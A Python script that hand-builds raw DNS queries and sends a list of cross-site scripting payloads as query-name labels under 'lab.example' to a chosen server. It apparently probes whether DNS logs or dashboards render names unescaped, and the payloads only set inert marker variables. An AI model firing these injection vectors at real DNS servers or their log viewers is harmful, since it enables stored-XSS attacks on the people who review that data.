#!/usr/bin/env python3
"""Send raw DNS queries whose names contain bytes a normal resolver library would refuse.
usage: dnsq.py <server> <name-as-python-bytes-literal-labels joined by '|'> [qtype]
Each label is given verbatim (may contain spaces, <, >, quotes, dots are label separators only via '|').
"""
import socket, struct, sys, os

def build(labels, qtype=1):
    q = struct.pack(">HHHHHH", int.from_bytes(os.urandom(2), "big"), 0x0100, 1, 0, 0, 0)
    for l in labels:
        b = l if isinstance(l, bytes) else l.encode("latin-1")
        assert 0 < len(b) < 64, len(b)
        q += bytes([len(b)]) + b
    return q + b"\0" + struct.pack(">HH", qtype, 1)

def ask(server, labels, qtype=1, timeout=2):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    s.sendto(build(labels, qtype), (server, 53))
    try:
        d, _ = s.recvfrom(4096)
        return d[3] & 0xF, len(d)
    except socket.timeout:
        return None, 0

if __name__ == "__main__":
    server = sys.argv[1]
    payloads = [
        ["<img src=x onerror=__xss_q1=1>", "lab", "example"],
        ["\"><script>__xss_q2=1</script>", "lab", "example"],
        ["'-__xss_q3=1-'", "lab", "example"],
        ["<svg/onload=__xss_q4=1>", "lab", "example"],
        ["javascript:__xss_q5=1", "lab", "example"],
        ["x\" onmouseover=\"__xss_q6=1", "lab", "example"],
        ["{{constructor.constructor('__xss_q7=1')()}}", "lab", "example"],
        ["</td></tr><img src=x onerror=__xss_q8=1>", "lab", "example"],
        ["a\r\nb<img src=x onerror=__xss_q9=1>", "lab", "example"],
        ["&lt;img src=x onerror=__xss_q10=1&gt;", "lab", "example"],
        ["cn", "lab", "example"],
        ["txt", "lab", "example"],
    ]
    for p in payloads:
        for qt in (1, 16, 28):
            rc, n = ask(server, p, qt)
        print(repr(".".join(p))[:70], "rcode", rc, "len", n)
